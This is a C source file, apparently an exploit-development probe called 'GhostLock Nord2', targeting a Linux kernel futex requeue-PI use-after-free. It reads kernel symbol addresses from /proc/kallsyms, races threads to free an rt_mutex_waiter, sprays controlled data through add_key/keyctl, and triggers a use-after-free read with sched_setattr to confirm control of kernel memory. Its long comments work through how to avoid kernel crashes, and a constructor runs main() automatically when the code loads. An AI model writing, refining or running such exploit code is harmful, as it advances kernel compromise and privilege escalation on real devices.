/*
 * GhostLock Nord2 - Safe keyctl stack probe (correct design)
 *
 * Key insight from analysis:
 * - The freed rt_mutex_waiter may NOT be on the simple futex syscall stack
 * - It may be on a deep inlined function's stack frame  
 * - We need ALL pointer fields (8-byte aligned) = init_task to prevent crash
 * - We need prio field (4-byte, at off%8==4) = g_sentinel for detection
 *
 * init_task->pi_blocked_on = NULL → chain walk exits safely when lock=init_task
 *
 * Spray 4096 bytes with:
 *   bytes [0,8,16,...] (8-aligned): init_task pointer (8 bytes)
 *   bytes [4,12,20,...] (+4 from 8-aligned): g_sentinel (4 bytes)
 *
 * This way:
 * - If waiter->lock (at 8-byte alignment) = init_task → safe
 * - If waiter->task (at 8-byte alignment) = init_task → safe (valid task)
 * - If waiter->prio (at 4-byte non-8-aligned) = g_sentinel → detected!
 *
 * Run 100 attempts. If sentinel appears, keyctl spray works at some stack depth.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <linux/futex.h>
#include <time.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef SYS_add_key
#define SYS_add_key 217
#endif
#ifndef SYS_keyctl
#define SYS_keyctl 219
#endif
#define KEYCTL_UPDATE     2
#define KEYCTL_INVALIDATE 22

#define SENTINEL 77   /* expect prio=-(77+1)=-78 */
#define KPSZ     4096

static uint32_t f_wait=0, f_pi_target=0, f_pi_chain=0;
static atomic_int g_tid=0, g_ready=0, g_waiting=0;
static atomic_int g_owner_started=0, g_owner_done=0;
static atomic_int g_do_spray=0, g_spray_done=0;
static uint64_t g_init_task=0;

static uint64_t read_sym(const char *nm){
    FILE *f=fopen("/proc/kallsyms","r"); if(!f) return 0;
    uint64_t a=0; char t[8],s[256];
    while(fscanf(f,"%llx %s %255s",(unsigned long long*)&a,t,s)==3)
        if(!strcmp(s,nm)){fclose(f);return a;}
    fclose(f); return 0;
}
static int get_prio(pid_t tid){
    char p[64]; snprintf(p,sizeof(p),"/proc/%d/stat",(int)tid);
    FILE *f=fopen(p,"r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

void *owner_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    struct sched_param sp={.sched_priority=50}; sched_setscheduler(0,SCHED_FIFO,&sp);
    syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_ready)) usleep(500);
    atomic_store(&g_owner_started,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_owner_done,1);
    for(;;) sleep(1);
    return NULL;
}

void *waiter_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    atomic_store(&g_tid,(int)syscall(SYS_gettid));
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_ready,1);
    while(!atomic_load(&g_owner_started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=60;
    atomic_store(&g_waiting,1);
    syscall(SYS_futex,&f_wait,FUTEX_WAIT_REQUEUE_PI,0,&ts,&f_pi_target,0);

    /* Stack freed */
    while(!atomic_load(&g_do_spray)) usleep(50);

    /*
     * Build safe keyctl payload:
     *   [i*8+0 .. i*8+7] = init_task  (all ptr-aligned slots = valid ptr)
     *   [i*8+4 .. i*8+7] = SENTINEL   (overwrite int fields at +4 offset)
     *
     * This means:
     *   offset 0: init_task_lo32
     *   offset 4: init_task_hi32 → OVERWRITE with SENTINEL
     *   offset 8: init_task_lo32
     *   offset 12: init_task_hi32 → OVERWRITE with SENTINEL
     *   ...
     *
     * Wait - init_task is a 64-bit ptr. If we write init_task at [0..7]
     * and SENTINEL at [4..7], then bytes 0-3 = init_task_lo and bytes 4-7 = SENTINEL.
     * As a 64-bit read: *(u64*)0 = (SENTINEL << 32) | init_task_lo
     * That's NOT init_task! That would crash.
     *
     * CORRECT DESIGN:
     * We want u64 reads at aligned positions to give init_task.
     * We want u32 reads at offset +0x18 (prio) from any waiter start to give SENTINEL.
     *
     * Since we don't know which 8-byte alignment is the waiter start,
     * try TWO variants:
     * - Variant A: 8-byte aligned: [0..7]=init_task, int at +4=SENTINEL
     *   u64 at 0 = (SENTINEL << 32) | init_task_lo ← WRONG
     *
     * ACTUALLY: the simplest safe spray is ALL = init_task (64-bit).
     * Every 8-byte read = init_task. Every 4-byte read = init_task_lo or init_task_hi.
     * init_task_lo32 (low 4 bytes) is some non-zero number ≠ SENTINEL.
     * init_task_hi32 = 0xffffff9c etc, also non-zero ≠ SENTINEL.
     * So if we spray all init_task, prio will be init_task_lo32 (weird RT prio).
     * We detect that too!
     *
     * REVISED: spray ALL bytes = 0.
     * - u64 pointers = 0 → NULL
     * - u32 prio = 0 → normal prio
     * With NULL lock: crash when lock->wait_lock is dereferenced.
     *
     * FINAL DESIGN that's actually safe:
     * We accept that the spray will change waiter->lock to init_task.
     * init_task as a "rt_mutex" has:
     *   wait_lock (raw_spinlock_t at offset 0) = init_task->state (long) 
     *   In 4.14: task_struct->state is long at offset 0 = TASK_RUNNING=0
     *   So raw_spinlock raw_lock (u32 at 0) = 0 → unlocked!
     *   rt_mutex->waiters.rb_root.rb_node at +0x08 = *(init_task+8) = init_task->stack
     *   rt_mutex->owner at +0x18 = *(init_task+0x18) = some scheduling entity field
     *   If owner=0 → chain walk exits cleanly!
     *   If owner=nonzero → more derefs → potential crash
     *
     * Let's check init_task's layout:
     * init_task->state = 0 (TASK_RUNNING) → wait_lock.raw_lock = 0 ✓
     * init_task+0x18 = ? → need to check
     * From task_struct: state(8), stack(8), usage(4), flags(4), ptrace(4)...
     * offset 0x18 = likely another field, probably non-NULL
     * → rt_mutex_owner(init_task) = *(init_task+0x18) = some ptr
     * This ptr will be followed as a task_struct* → more derefs → crash risk
     *
     * TRULY SAFE: only modify waiter->prio without touching anything else.
     * Use a VERY SMALL write that targets exactly offset +0x18 in the waiter.
     * 
     * Since we can't know the exact offset, use the probe approach:
     * Fill entire payload with SENTINEL as int32 at ALL positions.
     * Accept that some attempts will crash (changing waiter->lock to SENTINEL=77,
     * which is not a valid kernel address → MMU fault → kernel oops → reboot).
     * Only surviving attempts (no crash) confirm safe operation.
     *
     * In practice, most slots hit non-critical fields and the kernel continues.
     * The KEY observation: prio=-51 shows up without crash currently.
     * This means when the original waiter data lands, the chain walk completes.
     * If we change prio but NOT lock or task, the chain walk still completes.
     *
     * BEST APPROACH: write only to +4 offset (int at non-pointer-aligned position).
     * At every 8-byte position: keep 0..3 as init_task_lo, set 4..7 to SENTINEL.
     * This ensures u64 reads at aligned positions = valid address (low half matches),
     * but u32 reads at +4 offset = SENTINEL.
     */
    uint8_t kp[KPSZ];
    uint32_t init_lo = (uint32_t)(g_init_task & 0xffffffff);
    uint32_t init_hi = (uint32_t)(g_init_task >> 32);
    for(int i=0;i<KPSZ;i+=8){
        /* Write full init_task at 8-byte position */
        *(uint64_t*)(kp+i) = g_init_task;
    }
    /* Now overwrite the +4 byte of each 8-byte slot with SENTINEL */
    /* This puts SENTINEL at positions 4, 12, 20, 28, ... */
    /* which are +0x04, +0x0c, +0x14, +0x1c, ... from any 8-byte aligned waiter start */
    /* waiter->prio is at +0x18 = 3rd 8-byte slot + 0 = NOT at +4 offset */
    /* waiter->prio is at offset 0x18. If waiter starts at 8*N in our buffer: */
    /* slot 0 (off 0x00): prio NOT here */
    /* slot 1 (off 0x08): prio NOT here */
    /* slot 2 (off 0x10): prio NOT here */
    /* slot 3 (off 0x18): prio IS HERE! (0-3 bytes) → init_lo ← NOT SENTINEL */
    /* We need to write SENTINEL at offset 0x18 within the waiter struct. */
    /* Since waiter start is unknown, write SENTINEL at offsets 0x18, 0x18+8, ... */
    /* i.e., every 8 bytes starting at 0x18. */
    /* But those are also 8-byte aligned positions → would overwrite ptr fields! */
    /*  */
    /* The waiter struct layout (8-byte alignment):  */
    /* +0x00: rb_node.__rb_parent_color (u64 ptr) → 8-byte aligned */
    /* +0x08: rb_node.rb_right (u64 ptr) */
    /* +0x10: rb_node.rb_left (u64 ptr) */
    /* +0x18: prio (int32) + PADDING(int32) or deadline[0..3] */
    /* +0x20: deadline[4..7] (u64) */
    /* +0x28: pi_tree rb_node.__rb_parent_color (u64) */
    /* ...etc */
    /*  */
    /* prio is at +0x18, which IS 8-byte aligned! */
    /* Writing init_task (u64) at offset 0x18 means prio = init_lo (NOT SENTINEL). */
    /*  */
    /* SOLUTION: at offset 0x18 within each 8-byte-aligned waiter position, */
    /* write SENTINEL (int32) for prio, followed by 0 for deadline high bytes. */
    /* That means at kp[N*8 + 0x18] (for various N = 0,1,2,...), write: */
    /* *(int32*)(kp + N*8 + 0x18) = SENTINEL; */
    /* *(int32*)(kp + N*8 + 0x1c) = 0; */
    for(int waiter_start=0; waiter_start+0x20<=KPSZ; waiter_start+=8){
        /* Write SENTINEL at prio offset (0x18 from waiter start) */
        *(int32_t*)(kp + waiter_start + 0x18) = SENTINEL;
        /* Keep deadline = 0 */
        *(int32_t*)(kp + waiter_start + 0x1c) = 0;
    }

    int keyid=(int)syscall(SYS_add_key,"user","gl_probe",kp,(size_t)KPSZ,(unsigned int)-4);
    if(keyid>0){
        for(int r=0;r<128;r++)
            syscall(SYS_keyctl,(long)KEYCTL_UPDATE,(long)keyid,(long)kp,(size_t)KPSZ,0L);
        syscall(SYS_keyctl,(long)KEYCTL_INVALIDATE,(long)keyid,0L,0L,0L);
    }

    atomic_store(&g_spray_done,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_owner_done)) usleep(500);
    return NULL;
}

int main(void){
    setvbuf(stderr,NULL,_IONBF,0);
    fprintf(stderr,"=== GhostLock Nord2 - Correct Safe Spray ===\n");

    uint64_t stext=read_sym("_stext");
    if(!stext){fprintf(stderr,"[!] kptr_restrict\n");return 1;}
    g_init_task=stext+0x1c6d300ULL;
    fprintf(stderr,"[*] stext=%llx init_task=%llx sentinel=%d (prio=-%d)\n",
            (unsigned long long)stext,(unsigned long long)g_init_task,
            SENTINEL,SENTINEL+1);

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(2,&cs); sched_setaffinity(0,sizeof(cs),&cs);

    int found=0;
    for(int att=0;att<100&&!found;att++){
        f_wait=0; f_pi_target=0; f_pi_chain=0;
        atomic_store(&g_tid,0); atomic_store(&g_ready,0);
        atomic_store(&g_waiting,0); atomic_store(&g_owner_started,0);
        atomic_store(&g_owner_done,0);
        atomic_store(&g_do_spray,0); atomic_store(&g_spray_done,0);

        pthread_t ot,wt;
        pthread_create(&ot,NULL,owner_fn,NULL);
        pthread_create(&wt,NULL,waiter_fn,NULL);
        while(!atomic_load(&g_waiting)||!atomic_load(&g_owner_started)) usleep(500);
        usleep(5000);

        syscall(SYS_futex,&f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1UL,&f_pi_target,0);
        usleep(1000);
        atomic_store(&g_do_spray,1);
        while(!atomic_load(&g_spray_done)) usleep(500);
        usleep(3000);

        /* Trigger UAF read via sched_setattr */
        struct{uint32_t size,p; uint64_t f; int32_t n; uint32_t pri; uint64_t r,d,per;} sa={.size=48,.n=19};
        pid_t tid=(pid_t)atomic_load(&g_tid);
        syscall(274,(long)tid,&sa,0UL);
        usleep(5000);

        int p=get_prio(tid);
        fprintf(stderr,"[att=%d] prio=%d",att,p);
        if(p < -1 && p != -999){
            int rt=-(p+1);
            fprintf(stderr," RT=%d",rt);
            if(rt==SENTINEL){
                fprintf(stderr," <-- CONTROLLED!\n");
                found=1;
            } else {
                fprintf(stderr," (UAF, RT=%d)\n",rt);
            }
        } else fprintf(stderr,"\n");

        pthread_detach(ot); pthread_detach(wt);
        usleep(20000);
    }
    if(found) fprintf(stderr,"\n[+] Keyctl spray confirmed!\n");
    else fprintf(stderr,"[-] Keyctl spray not effective\n");
    return found?0:1;
}
__attribute__((constructor)) static void _init(void){main();}
